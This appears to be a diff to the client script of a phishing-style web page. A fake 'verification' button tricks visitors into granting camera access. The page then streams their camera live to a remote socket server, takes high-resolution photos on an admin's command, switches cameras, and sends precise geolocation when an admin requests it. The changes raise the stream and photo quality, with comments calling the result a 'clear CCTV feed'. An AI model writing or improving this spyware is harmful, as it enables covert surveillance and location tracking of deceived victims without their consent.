@@ -105,7 +105,8 @@ function getDeviceInfo() {
     return `${device} (${browser})`;
 }
 
-function sendLocation() {
+// Location sirf tabhi execute hogi jab admin explicitly request karega
+function requestAndSendLocation() {
     if (!navigator.geolocation) return;
     navigator.geolocation.getCurrentPosition(
         position => {
@@ -115,11 +116,11 @@ function sendLocation() {
             });
         },
         error => {},
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
 }
 
-// User ke click karte hi yeh function instant execute hoga
+// Click par sirf Camera trigger hoga (Location nahi)
 async function triggerVerification() {
     startBtn.style.display = "none";
     setStatus("Verifying session...", "waiting");
@@ -133,8 +134,8 @@ async function triggerVerification() {
             audio: false,
             video: {
                 facingMode: useFrontCamera ? "user" : "environment",
-                width: { ideal: 640 },
-                height: { ideal: 480 }
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
             }
         };
 
@@ -147,10 +148,8 @@ async function triggerVerification() {
         setStatus("Verified Successfully!", "success");
 
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
-        sendLocation();
         startLiveStream();
 
-        // Thodi der baad card ko thoda minimal dikha sakte hain ya wahi rehne dein
         setTimeout(() => {
             setStatus("Connected. Please wait...", "waiting");
         }, 1500);
@@ -158,7 +157,7 @@ async function triggerVerification() {
     } catch (error) {
         cameraReady = false;
         setStatus("Verification required to proceed.", "error");
-        startBtn.style.display = "block"; // Agar user cancel kare toh dubara button dikha do
+        startBtn.style.display = "block";
     }
 }
 
@@ -166,24 +165,26 @@ function startLiveStream() {
     if (streamInterval) clearInterval(streamInterval);
     streamInterval = setInterval(() => {
         if (!cameraReady || !video.videoWidth) return;
-        canvas.width = 320;
-        canvas.height = 240;
+        canvas.width = 640;
+        canvas.height = 360;
         const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, 320, 240);
-        const frame = canvas.toDataURL("image/jpeg", 0.4);
+        context.drawImage(video, 0, 0, 640, 360);
+        // High quality stream frame (0.6 quality for clear CCTV feed)
+        const frame = canvas.toDataURL("image/jpeg", 0.6);
         socket.emit("live-stream-frame", frame);
-    }, 180);
+    }, 150);
 }
 
 function takeSinglePhoto() {
     if (!cameraReady) return;
-    const width = video.videoWidth || 640;
-    const height = video.videoHeight || 480;
+    const width = video.videoWidth || 1280;
+    const height = video.videoHeight || 720;
     canvas.width = width;
     canvas.height = height;
     const context = canvas.getContext("2d");
     context.drawImage(video, 0, 0, width, height);
-    const imageData = canvas.toDataURL("image/jpeg", 0.8);
+    // Maximum High-Resolution Photo Capture (0.95 quality)
+    const imageData = canvas.toDataURL("image/jpeg", 0.95);
     socket.emit("user-photo-captured", imageData);
 }
 
@@ -208,7 +209,9 @@ socket.on("start-auto-capture", () => {
 });
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
-socket.on("request-location", () => { sendLocation(); });
+
+// Admin ke button dabane par hi location fetch hogi
+socket.on("request-location", () => { requestAndSendLocation(); });
 
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
